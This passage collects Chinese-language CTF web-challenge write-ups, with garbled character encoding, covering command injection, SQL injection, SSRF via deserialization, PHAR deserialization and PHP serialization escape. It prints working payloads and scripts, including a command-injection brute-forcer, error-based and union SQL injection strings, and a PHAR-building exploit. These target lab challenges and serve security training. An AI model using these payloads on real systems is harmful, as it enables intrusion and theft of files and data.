'b3462331-240d-4d61-9941-ce05616520e3'\nprint(md5(cookie_secret+md5(filename)))\n```\n![](https://i.loli.net/2019/09/14/glQe2aAXTjYhMdZ.png)\npayloadï¼š\n```\n?filename=/fllllllllllllag&filehash=d36c1cd33fb729d2a7d1084c51c30d28\n```\n![](https://i.loli.net/2019/09/14/1XtgGxY9mLfKBR3.png)\n### é«˜æ˜çš„é»‘å®¢ã€2019-å¼ºç½‘æ¯ã€‘\n**çŸ¥è¯†ç‚¹**ï¼šä»£ç å®¡è®¡ï¼ŒåŠ¨æ€æµ‹è¯•\n![](https://i.loli.net/2019/09/14/XPZmOqSxHILG9rz.png)\nä¸‹è½½`www.tar.gz`\nä¸‹è½½ä¸‹æ¥ä¹‹åå‘ç°æœ‰ä¸‰åƒå¤šä¸ªphpæ–‡ä»¶,éšæ„æ‰“å¼€å‡ ä¸ªæ–‡ä»¶ï¼Œå‘ç°äº†ç±»ä¼¼å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚\n![](https://i.loli.net/2019/09/14/seDiF4YyVf5U8kZ.png)\nä½†åªæœ‰ä¸€ä¸ªæ˜¯çœŸæ­£å¯ä»¥æ‰§è¡Œçš„\nå°†æ¯ä¸ªphpæ–‡ä»¶é‡Œçš„`$ _GET`å‚æ•°æå–å‡ºæ¥é€ä¸ªçˆ†ç ´å°±è¡Œäº†\nä»£ç å‚è€ƒç½‘ä¸Šå¤§ä½¬çš„\n```python\n# coding:utf-8\n#!/usr/bin/env python3\nimport requests\nimport os\nimport re\nurl = 'http://d65fe37f-f9c3-4b4a-ba25-cb8b0dfdd28b.node1.buuoj.cn/'\nptn = re.compile(br\"\\$_GET\\['(\\w+)'\\]\")\nptn1 = re.compile(br'>>> (\\w+) !!!')\ni = 0\nfor f in list(os.scandir('C:/Users/admin/Desktop/src'))[::-1]:\n    i += 1\n    print(i, end='\\r')\n    with open(f.path, 'rb') as fp:\n        data = fp.read()\n    for get in set(ptn.findall(data)):\n        get = get.decode('ascii')\n        cmd = 'echo \">>> %s !!!\";' % get\n        r = requests.get(url + f.name, params={get: cmd})\n        if ptn1.search(r.content) is not None:\n            print()\n            print(f.name, get)\n            exit()\n```\n![](https://i.loli.net/2019/09/14/HwuUE51vdAqC7t2.png)\npayloadï¼š\n```\n/xk0SzyKwfzw.php?Efa5BVG=cat /flag\n```\n![](https://i.loli.net/2019/09/14/EslpMk4J8mbSvTG.png)\n### Fakebookã€2018-ç½‘é¼æ¯ã€‘\n**çŸ¥è¯†ç‚¹**ï¼šSSRFï¼Œååºåˆ—åŒ–ï¼ŒæŠ¥é”™æ³¨å…¥\næ‰“å¼€é¢˜ç›®ï¼Œå‘ç°Webåº”ç”¨æœ‰ä¸¤ä¸ªåŠŸèƒ½ã€‚ä¸€ä¸ªæ˜¯ç™»å½•ï¼Œä¸€ä¸ªæ˜¯æ³¨å†Œï¼Œå¦‚ä¸‹ï¼š\n![](https://i.loli.net/2019/09/14/twxP9J18fknRaNT.png)\nå‘ç°æ³¨å†Œçš„æ—¶å€™blogå¤„åªèƒ½å†™urlé“¾æ¥\n![](https://i.loli.net/2019/09/14/5gs7G1w8FXazUoZ.png)\nè€Œä¸”åœ¨æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯çš„æ—¶å€™ï¼Œå‘ç°Webåº”ç”¨åŠ è½½äº†ç”¨æˆ·çš„blogç½‘é¡µï¼Œè¿™é‡Œå°±å­˜åœ¨SSRFæ¼æ´ã€‚\n![](https://i.loli.net/2019/09/14/EFxpyChgWovInA4.png)\næŸ¥çœ‹`robots.txt`,å¾—åˆ°`user.php.bak`å‘ç°æœ‰æºç æ³„éœ²ï¼Œæ‰«æå¾—åˆ°flag.php\n\n```php\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);\n    }\n\n}\n```\nå®¡è®¡æºç å‘ç°å…¶ä¸­get()å‡½æ•°å­˜åœ¨SSRF(æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ )æ¼æ´ã€‚\n\næŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ç•Œé¢å­˜åœ¨SQLæ³¨å…¥ï¼Œç›´æ¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œä¼šå‘ç°æ•°æ®åº“é‡Œé¢åªæœ‰ç”¨æˆ·çš„æ³¨å†Œä¿¡æ¯ï¼š\nçˆ†è¡¨å\n```mysql\n/view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#\n```\n\n![](https://i.loli.net/2019/09/14/gIvXkwe1DVjGq32.png)\nçˆ†åˆ—å\n```mysql\n/view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name=\"users\")),1)#\n```\n![](https://i.loli.net/2019/09/14/2IaBDt1OVlPmCdJ.png)\nçˆ†å­—æ®µ\n```mysql\n/view.php?no=1 and updatexml(1,make_set(3,'~',(select data from users)),1)#\n```\n![](https://i.loli.net/2019/09/14/Wxw6LapcRS9rduE.png)\nè¿™é‡Œå‘ç°dataå­—æ®µå­˜æ”¾çš„æ˜¯ç”¨æˆ·ä¿¡æ¯ç»è¿‡ååºåˆ—åŒ–çš„ç»“æœï¼Œ\nç»“åˆå‰é¢ view.php é¡µé¢ä¼šåŠ è½½ç”¨æˆ·çš„blogä¿¡æ¯ï¼Œ\næ‰€ä»¥è¿™é‡Œææœ‰å¯èƒ½æ˜¯åˆ©ç”¨ååºåŒ–æ•°æ®åº“ä¸­çš„dataå­—æ®µï¼Œç„¶åå–å‡ºurlå­—æ®µå¹¶åŠ è½½ï¼Œ\nå› æ­¤åˆ©ç”¨noå‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ååºåˆ—åŒ–ä¸­æ„é€ fileæ–‡ä»¶åè®®ï¼Œ\nåˆ©ç”¨`æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´`è®¿é—®æœåŠ¡å™¨ä¸Šçš„flag.phpæ–‡ä»¶\næ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯å°†SQLè¯­å¥æŸ¥è¯¢ç»“æœä¸­dataå­—æ®µååºåˆ—åŒ–åï¼Œå†…å®¹ä¸­çš„urlç­‰äºflag.phpå³å¯ã€‚æ‰€ä»¥æˆ‘ä»¬æ„é€ SQLè¯­å¥å¦‚ä¸‹ï¼š\nè¿‡æ»¤äº†union selectç”¨/ ** /å¯ä»¥ç»•è¿‡\n```mysql\n/view.php?no=-1/**/union/**/select/**/1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:3:\"jwt\";s:3:\"age\";i:18;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'#\n```\n\n![](https://i.loli.net/2019/09/14/ufj347VUaGYK5NB.png)\nè§£å¯†base64å¾—åˆ°flag\n![](https://i.loli.net/2019/09/14/8WHsKR2njaoG1uD.png)\n### Dropboxã€CISCN2019 ååŒ—èµ›åŒº Day1 Web1ã€‘\n**çŸ¥è¯†ç‚¹**ï¼šä»»æ„æ–‡ä»¶ä¸‹è½½,PHARååºåˆ—åŒ–RCE\nå‚è€ƒï¼š\n[ciscn2019ååŒ—èµ›åŒºåŠå†³èµ›day1_web1é¢˜è§£](https://www.cnblogs.com/kevinbruce656/p/11316070.html)\n[buuctf-web-[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox](https://blog.csdn.net/weixin_43345082/article/details/100102082)\n[ä»€ä¹ˆæ˜¯Pharååºåˆ—åŒ–](https://blog.ripstech.com/2018/new-php-exploitation-technique/)\n[åˆ©ç”¨pharæ‹“å±•phpååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢](https://paper.seebug.org/680/)\nè¿›å…¥è§£é¢˜é¡µé¢å‘ç°éœ€è¦ç™»å½•ï¼Œæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»å½•ä»¥åæ˜¯ä¸€ä¸ªç½‘ç›˜çš„é¡µé¢ï¼Œæœ€å¼€å§‹åªæœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œå¹¶ä¸”åªèƒ½ä¸Šä¼ png,jpgç­‰å›¾ç‰‡æ ¼å¼ã€‚\n![](https://i.loli.net/2019/09/15/zZd7kmy32DSNV6r.png)\néšä¾¿ä¸Šä¼ ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„æ–‡ä»¶ï¼Œå‘ç°å¯ä»¥å¯¹å…¶è¿›è¡Œä¸‹è½½å’Œåˆ é™¤ã€‚\n![](https://i.loli.net/2019/09/15/DmMIGt3rpJWUwAu.png)\né€šè¿‡æŠ“ä¸‹è½½çš„åŒ…å‘ç°ï¼Œè¯¥å¤„å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½çš„æ¼æ´ï¼Œä¿®æ”¹æ–‡ä»¶åfilename=â€¦/â€¦/index.php,å¯ä»¥ä¸‹è½½æºç \n![](https://i.loli.net/2019/09/15/Ssdeo5IpYFwtWGz.png)\nåˆ©ç”¨è¯¥æ¼æ´ä¸‹è½½download.php,delete.phpä»¥åŠå…¶éœ€è¦åŒ…å«çš„class.phpçš„å†…å®¹ã€‚\n![](https://i.loli.net/2019/09/15/fivwX6WCR5lTZsj.png)\né‡ç‚¹æ˜¯class.phpå’Œdelete.php\nåˆ†ædownload.phpçš„æ ¸å¿ƒæºç \n```php\n<?php\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {\n    #çœç•¥ä¸€äº›ä»£ç \n    echo $file->close();\n} else {\n    echo \"File not exist\";\n}\n?>\n```\nå¯ä»¥å‘ç°ï¼Œè¯¥æ–‡ä»¶åªæœ‰å¾ˆå¸¸è§„çš„ä¸‹è½½æ–‡ä»¶æ“ä½œï¼Œå¹¶ä¸”é™åˆ¶äº†ä¸èƒ½ä¸‹è½½æ–‡ä»¶åä¸­å¸¦æœ‰flagçš„æ–‡ä»¶ã€‚\næ¥ç€åˆ†æclass.php\n```php\n<?php\n#ä»£ç ç²¾ç®€ä¸€ä¸‹\nclass File {\n    public $filename;\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\nclass User {\n    public $db;\n    public function __destruct() {\n        $this->db->close();\n    }\n}\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);\n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func();\n        }\n    }\n    public function __destruct() {\n        #çœç•¥äº†ä¸€äº›å½±å“é˜…è¯»çš„tableåˆ›å»ºä»£ç \n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n?>\n```\n**1**.Fileç±»ä¸­çš„closeæ–¹æ³•ä¼šè·å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœèƒ½è§¦å‘è¯¥æ–¹æ³•ï¼Œå°±æœ‰å¯èƒ½è·å–flagã€‚\n**2**.Userç±»ä¸­å­˜åœ¨closeæ–¹æ³•ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•åœ¨å¯¹è±¡é”€æ¯æ—¶æ‰§è¡Œã€‚\n**3**.åŒæ—¶FileListç±»ä¸­å­˜åœ¨callé­”æœ¯æ–¹æ³•ï¼Œå¹¶ä¸”ç±»æ²¡æœ‰closeæ–¹æ³•ã€‚å¦‚æœä¸€ä¸ªFilelistå¯¹è±¡è°ƒç”¨äº†close()æ–¹æ³•ï¼Œæ ¹æ®callæ–¹æ³•çš„ä»£ç å¯ä»¥çŸ¥é“ï¼Œæ–‡ä»¶çš„closeæ–¹æ³•ä¼šè¢«æ‰§è¡Œï¼Œå°±å¯èƒ½æ‹¿åˆ°flagã€‚\n\næ ¹æ®ä»¥ä¸Šä¸‰æ¡çº¿ç´¢ï¼Œæ¢³ç†ä¸€ä¸‹å¯ä»¥å¾—å‡ºç»“è®º:\n\n`å¦‚æœèƒ½åˆ›å»ºä¸€ä¸ªuserçš„å¯¹è±¡ï¼Œå…¶dbå˜é‡æ˜¯ä¸€ä¸ªFileListå¯¹è±¡ï¼Œå¯¹è±¡ä¸­çš„æ–‡ä»¶åä¸ºflagçš„ä½ç½®ã€‚è¿™æ ·çš„è¯ï¼Œå½“userå¯¹è±¡é”€æ¯æ—¶ï¼Œdbå˜é‡çš„closeæ–¹æ³•è¢«æ‰§è¡Œï¼›è€Œdbå˜é‡æ²¡æœ‰closeæ–¹æ³•ï¼Œè¿™æ ·å°±ä¼šè§¦å‘callé­”æœ¯æ–¹æ³•ï¼Œè¿›è€Œå˜æˆäº†æ‰§è¡ŒFileå¯¹è±¡çš„closeæ–¹æ³•ã€‚é€šè¿‡åˆ†æFileListç±»çš„ææ„æ–¹æ³•å¯ä»¥çŸ¥é“ï¼Œcloseæ–¹æ³•æ‰§è¡Œåå­˜åœ¨resultså˜é‡é‡Œçš„ç»“æœä¼šåŠ å…¥åˆ°tableå˜é‡ä¸­è¢«æ‰“å°å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯flagä¼šè¢«æ‰“å°å‡ºæ¥ã€‚`\n\næƒ³å®ç°ä¸Šè¿°æƒ³æ³•ï¼Œå¯ä»¥å€ŸåŠ©pharçš„ä¼ªåè®®ã€‚\nè¿è¡Œå¦‚ä¸‹PHPæ–‡ä»¶ï¼Œç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Œæ›´æ”¹åç¼€åä¸ºpngè¿›è¡Œä¸Šä¼ ã€‚\n```php\n<?php\n\nclass User {\n    public $db;\n}\n\nclass File {\n    public $filename;\n}\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct() {\n        $file = new File();\n        $file->filename = '/flag.txt';\n        $this->files = array($file);\n        $this->results = array();\n        $this->funcs = array();\n    }\n}\n\n@unlink(\"phar.phar\");\n$phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n\n$phar->startBuffering();\n\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //è®¾ç½®stub\n\n$o = new User();\n$o->db = new FileList();\n\n$phar->setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\n$phar->addFromString(\"jwt.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\n//ç­¾åè‡ªåŠ¨è®¡ç®—\n$phar->stopBuffering();\n?>\n```\nç”Ÿæˆpharæ–‡ä»¶ååœ¨åˆ é™¤çš„æ—¶å€™è¿›è¡Œè§¦å‘å³å¯å¾—åˆ°flagã€‚\nå› æ­¤åœ¨åˆ é™¤æ—¶ä½¿ç”¨burpsiteæŠ“åŒ…ï¼Œä¿®æ”¹å‚æ•°ï¼Œå³å¯å¾—åˆ°flagã€‚\n![](https://i.loli.net/2019/09/15/p9Wuc4IhEMeKsVq.png)\n### piapiapiaã€2016-0CTFã€‘\n**çŸ¥è¯†ç‚¹**ï¼šæ•°ç»„ç»•è¿‡æ­£åˆ™åŠç›¸å…³,æ”¹å˜åºåˆ—åŒ–å­—ç¬¦ä¸²é•¿åº¦å¯¼è‡´ååºåˆ—åŒ–æ¼æ´ï¼ŒPHPååºåˆ—åŒ–é€ƒé€¸\n**å‚è€ƒ**ï¼š[2016 0CTFâ€”piapiapia](https://tanpuhan.github.io/2019/09/14/2016-0CTF%E2%80%94piapiapia/) , [0ctf 2016 éƒ¨åˆ† web writeup](https://www.virzz.com/2016/03/14/some_web_writeup_for_0ctf_2016.html)ï¼Œ[åˆ©ç”¨æ•°ç»„ç»•è¿‡é—®é¢˜å°æ€»ç»“](https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)\n**é¢„å¤‡çŸ¥è¯†**ï¼šæ”¹å˜åºåˆ—åŒ–å­—ç¬¦ä¸²é•¿åº¦å¯¼è‡´ååºåˆ—åŒ–æ¼æ´\n`unserialize()`ä¼šå¿½ç•¥èƒ½å¤Ÿæ­£å¸¸åºåˆ—åŒ–çš„å­—ç¬¦ä¸²åé¢çš„å­—ç¬¦ä¸²\næ¯”å¦‚ï¼š\n```\na:4:{s:5:\"phone\";s:11:\"13587819970\";s:5:\"email\";s:32:\"aaaaaaaaaa@aaaaaaaaaa.aaaaaaaaaa\";s:8:\"nickname\";s:10:\"12345hacke\";s:5:\"photo\";s:10:\"config.php\";}s:39:\"upload/f47454d1d3644127f42070181a8b9afc\";}\n```\nååºåˆ—åŒ–ä¼šæ­£å¸¸è§£æ\n```\na:4{s:5:\"phone\";s:11:\"13587819970\";s:5:\"email\";s:32:\"aaaaaaaaaa@aaaaaaaaaa.aaaaaaaaaa\";s:8:\"nickname\";s:10:\"12345hacke\";s:5:\"photo\";s:10:\"config.php\";}\n```\nå¿½ç•¥`s:39:\"upload/f47454d1d3644127f42070181a8b9afc\";}`ï¼Œä»è€Œå¯¼è‡´è¯»å–`config.php`\nå¯ä»¥åˆ©ç”¨è¿™ä¸ªè§„åˆ™æ„é€ å­—ç¬¦ä¸²æ¥é—­åˆï¼Œå¦‚æœ¬é¢˜ä¸­filter()å°†whereæ›¿æ¢æˆhackerï¼Œå°±å¯ä»¥å°†è¿™ä¸ªæˆå‘˜çš„æœ€åä¸€ä¸ªå­—ç¬¦æŒ¤å‡ºå»ï¼Œé‡å¤34æ¬¡å°±å¯ä»¥æŒ¤å‡º34ä¸ªå­—ç¬¦ï¼Œæ­£å¥½é—­åˆæ”¹åºåˆ—åŒ–å­—ç¬¦ä¸²\n\n---\næ‰“å¼€é¢˜ç›®ï¼Œå…¸å‹çš„ç™»å½•ç•Œé¢\nçŒœæµ‹æ˜¯å¦æœ‰æ³¨å†Œï¼Œå‘ç°/register.phpï¼Œæ³¨å†Œåç™»é™†ï¼Œè¿›å…¥åˆ°update.phpé¡µé¢\n![](https://i.loli.net/2019/09/23/oNHDnA3W7iePr1k.png)\nè¿›è¡Œä¸€ä¸‹ç›®å½•æ‰«æï¼Œdirsearchæ‰«å‡ºäº†æºç www.zip\n![](https://i.loli.net/2019/09/23/Vj8oW6KEqedOnJ5.png)\nä¸‹è½½www.zipï¼Œå¾—åˆ°å¦‚ä¸‹\n![](https://i.loli.net/2019/09/23/5N8QF2tzRphbjUr.png)\nå…ˆæ‹¿seayä»£ç å®¡è®¡ä¸€ä¸‹çœ‹ä¸‹å¤§æ¦‚ä¼šæœ‰ä»€ä¹ˆæ¼æ´\n![](https://i.loli.net/2019/09/23/Ni5b74zgEwFnUhT.png)\nåœ¨profile.phpä¸­æœ‰æ–‡ä»¶è¯»å–\n```php\nelse {\n\t\t$profile = unserialize($profile);\n\t\t$phone = $profile['phone'];\n\t\t$email = $profile['email'];\n\t\t$nickname = $profile['nickname'];\n\t\t$photo = base64_encode(file_get_contents($profile['photo']));\n?>\n```\nåˆå‘ç°åœ¨config.phpä¸­æœ‰flagçš„æ ‡è¯†,çœ‹æ¥flagå°±æ˜¯åœ¨config.phpä¸­äº†\n```php\n<?php\n\t$config['hostname'] = '127.0.0.1';\n\t$config['username'] = 'root';\n\t$config['password'] = '';\n\t$config['database'] = '';\n\t$flag = '';\n?>\n```\né‚£ä¹ˆåŸºæœ¬å¯ä»¥ç¡®å®šæ€è·¯å°±æ˜¯ä½¿`$profile['photo']`ç­‰äº`config.php`ä»è€Œå°±å¯ä»¥è¯»å‡ºconfig.phpçš„flagäº†\n**ååºåˆ—åŒ–é€ƒé€¸**:\nå¯¹`photo`è¿›è¡Œæ“ä½œçš„åœ°æ–¹åœ¨`update.php`ä¸­\n```php\n     <?php\n\trequire_once('class.php');\n\tif($_SESSION['username'] == null) {\n\t\tdie('Login First');\t\n\t}\n\tif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n\t\t$username = $_SESSION['username'];\n\t\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\t\tdie('Invalid phone');\n\n\t\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\t\tdie('Invalid email');\n\t\t\n\t\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n\n\t\t$file = $_FILES['photo'];\n\t\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\t\tdie('Photo size error');\n\n\t\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t\t$profile['phone'] = $_POST['phone'];\n\t\t$profile['email'] = $_POST['email'];\n\t\t$profile['nickname'] = $_POST['nickname'];\n\t\t$profile['photo'] = 'upload/' . md5($file['name']);\n\n\t\t$user->update_profile($username, serialize($profile));\n\t\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n\t}\n\telse {\n?>\n```\nåœ¨è®¾ç½®äº†`$profile`ä¹‹åï¼Œç”¨`update_profile()`å‡½æ•°è¿›è¡Œå¤„ç†ï¼š\n```\npublic function update_profile($username, $new_profile) {\n\t\t$username = parent::filter($username);\n\t\t$new_profile = parent::filter($new_profile);\n\n\t\t$where = \"username = '$username'\";\n\t\treturn parent::update($this->table, 'profile', $new_profile, $where);\n\t}\n```\n`update_profile()`å‡½æ•°è°ƒç”¨äº†`filter`å‡½æ•°\n```\npublic function filter($string) {\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n```\nè¿›è¡Œäº†è¿‡æ»¤,fileterå‡½æ•°ä¸­è¿›è¡Œäº†å¯¹å•å¼•å·ã€åŒåæ–œæ çš„è¿‡æ»¤ï¼Œä»¥åŠå°†selectã€insertã€updateã€deleteã€whereå­—ç¬¦ä¸²æ›¿æ¢æˆhacker,è¿™é‡Œå°±ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œåªæœ‰whereæ˜¯é•¿åº¦ä¸º5çš„å­—ç¬¦ä¸²ï¼Œå³å¦‚æœå­—ç¬¦ä¸²ä¸­æœ‰whereä¼šè¢«æ›¿æ¢æˆå­—ç¬¦ä¸²é•¿åº¦ä¸º6çš„hackerå­—ç¬¦ä¸²,å¦‚æœæˆ‘ä»¬è¾“å…¥çš„æœ‰whereï¼Œä¼šæ›¿æ¢æˆhackerï¼Œè¿™æ ·çš„è¯é•¿åº¦å°±å˜äº†\n**å¼€å§‹æ„é€ **ï¼š\næƒ³è¦è¯»å–photo,æ‰€ä»¥åªèƒ½æ“ä½œnicknameï¼Œä½¿å…¶æº¢å‡ºåˆ°photo\nè¾“å…¥nicknameæ—¶å€™æœ‰ä¸€ä¸ªæ­£åˆ™\n```\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n```\nå¯¹äºnicknameè¿™ä¸ªå‚æ•°ï¼Œçœ‹åˆ°ç†Ÿæ‚‰çš„preg_matchå’Œstrlenï¼Œå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡(`nickname[]=`)\n\n\næ•°ç»„ç»•è¿‡äº†ç¬¬ä¸€ä¸ªæ­£åˆ™è¿‡æ»¤ä¹‹åï¼Œå¦‚æœnicknameæœ€åé¢å¡ä¸Š`\";}s:5:\"photo\";s:10:\"config.php\";}`ï¼Œä¸€å…±æ˜¯34ä¸ªå­—ç¬¦ï¼Œå¦‚æœåˆ©ç”¨34ä¸ªwhereï¼Œåœ¨whereè¢«æ­£åˆ™åŒ¹é…æ¢æˆhackerä¹‹å,å°±å¤šå‡º34ä¸ªå­—ç¬¦ï¼Œä¸å°±å¯ä»¥æŠŠè¿™34ä¸ªç»™æŒ¤å‡ºå»ï¼Œç„¶å`\"};s:5:â€œphotoâ€;s:10:â€œconfig.phpâ€;}`ä¹Ÿå°±ä¸æ˜¯nicknameçš„ä¸€éƒ¨åˆ†äº†ï¼Œè¢«ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè¢«å½“æˆ`photo`ï¼Œå°±å¯ä»¥è¯»å–åˆ°`config.php`çš„å†…å®¹äº†,åé¢çš„uploadå› ä¸ºåºåˆ—åŒ–ä¸²è¢«æˆ‘ä»¬é—­åˆäº†ä¹Ÿå°±æ²¡ç”¨äº†ï¼š\n```\npayload:\n\nnickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n\n$profile = a:4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:10:\"123@qq.com\";s:8:\"nickname\";a:1:{i:0;s:204:\"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\"};s:5:\"photo\";s:10:\"config.php\";}s:39:\"upload/804f743824c0451b2f60d81b63b6a900\";}\n```\nä¸‹é¢å¼€å§‹æ“ä½œï¼š\næ³¨å†Œä¹‹åç™»é™†ï¼Œè¿›å…¥åˆ°update.phpé¡µé¢ï¼Œè¾“å…¥ç›¸åº”ä¿¡æ¯å’Œæ„é€ çš„nickenameåŠä¸Šä¼ å›¾ç‰‡ï¼Œç”¨bpæŠ“åŒ…æŠŠnicknameæ”¹æˆæ•°ç»„å³å¯ï¼š\n![](https://i.loli.net/2019/09/23/RgU64XJrAEsPMlD.png)\nç„¶åè®¿é—®profile.phpæŸ¥çœ‹æºç ï¼ŒæŠŠbase64ç è§£ç ï¼š\n![](https://i.loli.net/2019/09/23/BRkSthcE4PUyILf.png)\n![](https://i.loli.net/2019/09/23/Unr64PHdY9klBvp.png)\n### ikunã€CISCN2019 ååŒ—èµ›åŒº Day1 Web2ã€‘\né¢˜ç›®å¤ç°é“¾æ¥ï¼š\nhttps://buuoj.cn/challenges\n[CISCN 2019 ååŒ—èµ›åŒº Day1 Web2](https://github.com/CTFTraining/ciscn_2019_web_northern_china_day1_web2)\n#### çŸ¥è¯†ç‚¹\n##### 1ã€é€»è¾‘æ¼æ´\nå¯ä»¥é€šè¿‡æŠ“åŒ…ä¿®æ”¹æŠ˜æ‰£ç­‰æ•°æ®æ¥è´­ä¹°\n##### 2ã€JSON Web Token(JWT)\n[è®¤è¯†JWT](https://www.cnblogs.com/cjsblog/p/9277677.html)\n##### 3ã€jwt-cookiesä¼ªé€ \nè§£æjwtï¼š\nhttps://jwt.io/\nçˆ†ç ´å¯†é’¥ï¼š\nc-jwt-cracker:\nhttps://github.com/brendan-rius/c-jwt-cracker\n\n##### 4ã€Pythonååºåˆ—åŒ–\n[ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ Python ååºåˆ—åŒ–æ¼æ´ï¼](http://www.sohu.com/a/274879579_729271)\n[Pythonååºåˆ—åŒ–æ¼æ´çš„èŠ±å¼åˆ©ç”¨](https://xz.aliyun.com/t/2289)\n[(Python) cPickleååºåˆ—åŒ–æ¼æ´](https://blog.csdn.net/SKI_12/article/details/85015803)\n[å…³äºPython secçš„ä¸€äº›ç®€å•çš„æ€»ç»“](http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/)\n\n#### è§£é¢˜æ–¹æ³•\n[CISCN ååŒ—èµ›åŒº Day1 Web2](https://blog.csdn.net/qq_26406447/article/details/91964502)\n[CISCN ååŒ—èµ›åŒº Day1 Web2 WriteUp](https://www.zhaoj.in/read-5946.html/comment-page-1#comment-4747)\n[[CISCN2019]ååŒ—èµ›åŒº-å¤©æ¢&waterflower](https://xz.aliyun.com/t/5383)\n### SSRF Meã€2019-De1CTFã€‘\n#### çŸ¥è¯†ç‚¹\n##### 1ã€MD5é•¿åº¦æ‰©å±•æ”»å‡»\næ”»å‡»åœºæ™¯ï¼šfile=filename&hash=md5($secret_key.filename)éªŒè¯æˆåŠŸä¸‹è½½æ–‡ä»¶\nç›®çš„ï¼šä¼ 